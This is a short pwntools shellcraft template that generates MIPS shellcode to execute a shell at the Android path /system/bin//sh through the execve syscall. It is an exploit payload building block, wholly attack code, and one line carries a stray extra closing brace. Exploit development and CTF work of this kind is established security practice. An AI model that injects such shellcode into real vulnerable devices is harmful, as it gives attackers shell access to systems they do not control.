<% from pwnlib.shellcraft import mips %>
<%docstring>Execute /bin/sh</%docstring>

${mips.push(0)}
${mips.pushstr('sh')}
${mips.mov('$a1','$sp')}}

${mips.pushstr('/system/bin//sh')}

${mips.syscall('SYS_execve', '$sp', '$a1', 0)}

